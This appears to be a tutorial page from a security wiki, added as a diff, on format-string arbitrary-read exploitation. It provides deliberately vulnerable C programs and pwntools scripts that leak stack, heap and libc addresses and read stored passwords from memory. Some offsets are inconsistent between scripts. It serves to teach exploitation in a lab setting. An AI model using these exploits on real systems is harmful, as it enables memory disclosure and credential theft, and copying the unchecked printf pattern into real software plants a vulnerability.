@@ -1,0 +1,255 @@
+# Format Strings - Arbitrary Read Example
+
+## Read Binary Start
+
+### Code
+
+```c
+#include <stdio.h>
+
+int main(void) {
+    char buffer[30];
+
+    fgets(buffer, sizeof(buffer), stdin);
+
+    printf(buffer);
+    return 0;
+}
+```
+
+Compile it with:
+
+```python
+clang -o fs-read fs-read.c -Wno-format-security -no-pie
+```
+
+### Exploit
+
+```python
+from pwn import *
+
+p = process('./fs-read')
+
+payload = f"%11$s|||||".encode()
+payload += p64(0x00400000)
+
+p.sendline(payload)
+log.info(p.clean())
+```
+
+- The **offset is 11** because setting several As and **brute-forcing** with a loop offsets from 0 to 50 found that at offset 11 and with 5 extra chars (pipes `|` in our case), it's possible to control a full address.
+  - I used **`%11$p`** with padding until I so that the address was all 0x4141414141414141
+- The **format string payload is BEFORE the address** because the **printf stops reading at a null byte**, so if we send the address and then the format string, the printf will never reach the format string as a null byte will be found before
+- The address selected is 0x00400000 because it's where the binary starts (no PIE)
+
+<img src="broken-reference" alt="" width="477"><figcaption></figcaption>
+
+## Read passwords
+
+<details>
+<summary>Vulnerable binary with stack and BSS passwords</summary>
+
+```c
+#include <stdio.h>
+#include <string.h>
+
+char bss_password[20] = "hardcodedPassBSS"; // Password in BSS
+
+int main() {
+    char stack_password[20] = "secretStackPass"; // Password in stack
+    char input1[20], input2[20];
+
+    printf("Enter first password: ");
+    scanf("%19s", input1);
+
+    printf("Enter second password: ");
+    scanf("%19s", input2);
+
+    // Vulnerable printf
+    printf(input1);
+    printf("\n");
+
+    // Check both passwords
+    if (strcmp(input1, stack_password) == 0 && strcmp(input2, bss_password) == 0) {
+        printf("Access Granted.\n");
+    } else {
+        printf("Access Denied.\n");
+    }
+
+    return 0;
+}
+```
+
+</details>
+
+Compile it with:
+
+```bash
+clang -o fs-read fs-read.c -Wno-format-security
+```
+
+### Read from stack
+
+The **`stack_password`** will be stored in the stack because it's a local variable, so just abusing printf to show the content of the stack is enough. This is an exploit to BF the first 100 positions to leak the passwords form the stack:
+
+```python
+from pwn import *
+
+for i in range(100):
+    print(f"Try: {i}")
+    payload = f"%{i}$s\na".encode()
+    p = process("./fs-read")
+    p.sendline(payload)
+    output = p.clean()
+    print(output)
+    p.close()
+```
+
+In the image it's possible to see that we can leak the password from the stack in the `10th` position:
+
+<img src="../../images/image (1234).png" alt=""><figcaption></figcaption>
+
+<img src="../../images/image (1233).png" alt="" width="338"><figcaption></figcaption>
+
+### Read data
+
+Running the same exploit but with `%p` instead of `%s` it's possible to leak a heap address from the stack at `%25$p`. Moreover, comparing the leaked address (`0xaaaab7030894`) with the position of the password in memory in that process we can obtain the addresses difference:
+
+<img src="broken-reference" alt="" width="563"><figcaption></figcaption>
+
+Now it's time to find how to control 1 address in the stack to access it from the second format string vulnerability:
+
+<details>
+<summary>Find controllable stack address</summary>
+
+```python
+from pwn import *
+
+def leak_heap(p):
+    p.sendlineafter(b"first password:", b"%5$p")
+    p.recvline()
+    response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
+    return int(response, 16)
+
+for i in range(30):
+    p = process("./fs-read")
+
+    heap_leak_addr = leak_heap(p)
+    print(f"Leaked heap: {hex(heap_leak_addr)}")
+
+    password_addr = heap_leak_addr - 0x126a
+
+    print(f"Try: {i}")
+    payload = f"%{i}$p|||".encode()
+    payload += b"AAAAAAAA"
+
+    p.sendline(payload)
+    output = p.clean()
+    print(output.decode("utf-8"))
+    p.close()
+```
+
+</details>
+
+And it's possible to see that in the **try 14** with the used passing we can control an address:
+
+<img src="broken-reference" alt="" width="563"><figcaption></figcaption>
+
+### Exploit
+
+<details>
+<summary>Leak heap then read password</summary>
+
+```python
+from pwn import *
+
+p = process("./fs-read")
+
+def leak_heap(p):
+    # At offset 25 there is a heap leak
+    p.sendlineafter(b"first password:", b"%25$p")
+    p.recvline()
+    response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
+    return int(response, 16)
+
+heap_leak_addr = leak_heap(p)
+print(f"Leaked heap: {hex(heap_leak_addr)}")
+
+# Offset calculated from the leaked position to the possition of the pass in memory
+password_addr = heap_leak_addr + 0x1f7bc
+
+print(f"Calculated address is: {hex(password_addr)}")
+
+# At offset 14 we can control the addres, so use %s to read the string from that address
+payload = f"%14$s|||".encode()
+payload += p64(password_addr)
+
+p.sendline(payload)
+output = p.clean()
+print(output)
+p.close()
+```
+
+</details>
+
+<img src="broken-reference" alt="" width="563"><figcaption></figcaption>
+
+### Automating the offset discovery
+
+When the stack layout changes on every run (full ASLR/PIE), bruteforcing offsets manually is slow. `pwntools` exposes `FmtStr` to automatically detect the argument index that reaches our controlled buffer. The lambda should return the program output after sending the candidate payload. It stops as soon as it can reliably corrupt/observe memory.
+
+```python
+from pwn import *
+
+context.binary = elf = ELF('./fs-read', checksec=False)
+
+# helper that sends payload and returns the first line printed
+io = process()
+def exec_fmt(payload):
+    io.sendline(payload)
+    return io.recvuntil(b'\n', drop=False)
+
+fmt = FmtStr(exec_fmt=exec_fmt)
+offset = fmt.offset
+log.success(f"Discovered offset: {offset}")
+```
+
+You can then reuse `offset` to build arbitrary read/write payloads with `fmtstr_payload`, avoiding manual `%p` fuzzing.
+
+### PIE/libc leak then arbitrary read
+
+On modern binaries with PIE and ASLR, first leak any libc pointer (e.g. `__libc_start_main+243` or `setvbuf`), compute bases, then place your target address after the format string. This keeps the `%s` from being truncated by null bytes inside the pointer.
+
+<details>
+<summary>Leak libc and read arbitrary address</summary>
+
+```python
+from pwn import *
+
+elf = context.binary = ELF('./fs-read', checksec=False)
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+io = process()
+
+# leak libc address from stack (offset 25 from previous fuzz)
+io.sendline(b"%25$p")
+io.recvline()
+leak = int(io.recvline().strip(), 16)
+libc.address = leak - libc.symbols['__libc_start_main'] - 243
+log.info(f"libc @ {hex(libc.address)}")
+
+secret = libc.address + 0x1f7bc   # adjust to your target
+
+payload = f"%14$s|||".encode()
+payload += p64(secret)
+
+io.sendline(payload)
+print(io.recvuntil(b"|||"))  # prints string at calculated address
+```
+
+</details>
+
+## References
+
+- [NVISO - Format string exploitation](https://blog.nviso.eu/2024/05/23/format-string-exploitation-a-hands-on-exploration-for-linux/)
+- [Format string exploitation notes](https://hackmd.io/%40e20gJPRhRbKrBY5xcGKngA/SyM_Wcg_A)
